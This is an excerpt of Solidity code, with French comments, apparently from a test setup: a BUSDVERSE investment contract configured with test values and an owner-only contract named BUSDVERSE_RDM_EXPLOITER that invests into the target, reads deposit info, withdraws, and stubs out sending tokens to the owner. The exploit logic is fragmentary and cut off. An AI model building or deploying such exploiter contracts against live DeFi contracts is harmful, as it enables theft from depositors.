...
contract BUSDVERSE {
    ...
    IBEP20 public BUSD = IBEP20(0x84b9B910527Ad5C03A9Ca831909E21e236EA7b06); //chain link pour le test

	uint256 constant public INVEST_MIN_AMOUNT = 0 ether; //5 BUSD
	...
	uint256 constant public TIME_STEP = 0.1 days; //test
...
contract BUSDVERSE_RDM_EXPLOITER is Context, Ownable {


	function invest_blabla(BUSDVERSE _BUSDVERSE) public payable onlyOwner{

		_BUSDVERSE.invest(0x72ED605a17BBd63E86f0f849Ccb1a3684A70aa11,3, 1000000000000000000);

		(uint8 plan, uint256 percent, uint256 amount, uint256 profit, uint256 start, uint256 finish) = _BUSDVERSE.getUserDepositInfo(msg.sender, 0);
	...
	function withdraw_blabla(BUSDVERSE _BUSDVERSE) public payable onlyOwner{
		_BUSDVERSE.withdraw();
		// Ajouter ici le transfer du token BUSD vers msg.sender qui doit être le Owner
	}
	

	// Au lieu de faire les deux fonctions suivantes, 
	// on peut directement transférer les token dans le wallet du msg.sender
	// qui doit être le Owner
    function transferToken(IERC20 _token) public payable onlyOwner {
